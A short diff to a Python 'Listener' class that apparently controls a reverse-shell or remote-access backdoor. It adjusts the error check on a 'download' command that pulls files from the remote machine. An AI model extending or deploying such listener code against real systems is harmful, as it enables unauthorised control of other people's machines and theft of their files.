@@ -52,7 +52,7 @@ class Listener:
                     os.system('cls' if os.name == 'nt' else 'clear')
                 elif command.split()[0] == "download":
                     result = self.execute_remotely(command)
-                    if "[-] Error" not in result:
+                    if "[-]" not in result:
                         filename = command.split()[1]
                         self.write_file(filename, result)
                         print(f"[+] File Downloaded as {filename}")
